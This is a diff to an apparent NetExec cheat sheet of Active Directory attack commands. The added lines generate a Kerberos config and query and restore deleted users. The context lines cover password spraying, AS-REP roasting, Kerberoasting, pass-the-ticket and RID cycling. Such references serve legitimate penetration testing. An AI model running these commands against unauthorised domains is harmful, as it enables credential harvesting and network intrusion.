@@ -17,6 +17,9 @@ nxc smb <T> -u usr.txt -p <P> --no-bruteforce          # 1 try/user (no lockouts
 -k, --kerberos # Use Kerberos auth
 --use-kcache   # Use Kerberos authentication from ccache file 
 
+nxc smb <ip> --generate-krb5-file krb5.conf            # Generate krb5conf file
+sudo cp krb5.conf /etc/krb5.conf
+
 nxc ldap <T> -u <U> -p <P> --asreproast asrep.txt      # Harvest TGTs (No preauth)
 nxc ldap <T> -u <U> -p <P> --kerberoasting tgs.txt     # Harvest TGSs (Svc accts)
 nxc smb <T> -u <U> -p <P> --generate-tgt <U>           # Req TGT -> <U>.ccache
@@ -27,6 +30,8 @@ export KRB5CCNAME=t.ccache; nxc smb <T> --use-kcache   # Pass-the-Ticket (PtT)
 
 # === ENUM & SECRETS ==============================================================
 nxc ldap <T> -u <U> -p <P> --users --groups            # Users and Groups
+nxc ldap <T> -u <U> -p <P> -M tombstone -o ACTION=query# Query for deleted users
+	-M tombstone -o ACTION=restore ID=<ID> SCHEME=ldap # Restore deleted User
 nxc smb <T> -u <U> -p <P> --rid-brute                  # RID Cycling
 nxc smb <T> -u <U> -p <P> --shares                     # Shares
 nxc smb <T> -u <U> -p <P> -M webdav                    # Webdav
